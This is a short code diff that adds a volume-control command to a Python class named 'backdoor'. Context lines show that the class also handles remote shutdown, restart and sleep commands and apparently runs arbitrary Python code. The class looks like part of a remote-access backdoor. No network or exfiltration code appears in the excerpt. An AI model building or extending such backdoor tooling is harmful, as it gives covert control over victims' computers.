@@ -119,6 +119,21 @@ class backdoor:
                     output += "Computer is going on sleep\n"
                     continue
                 output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)\n"
+            elif command.startswith("volume"):
+                try:
+                    volume_command = command.split("(")
+                    volume_command_argument = volume_command[1].replace(")", "")
+                    print(volume_command_argument)
+                    if int(volume_command_argument) < 0:
+                        pyautogui.press("volumemute")
+                    else:
+                        for i in range(int(volume_command_argument)):
+                            pyautogui.press("volumeup")
+                    output += "Changed the volume\n"
+                except Exception:
+                    output += "Error\n"
+                
+
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
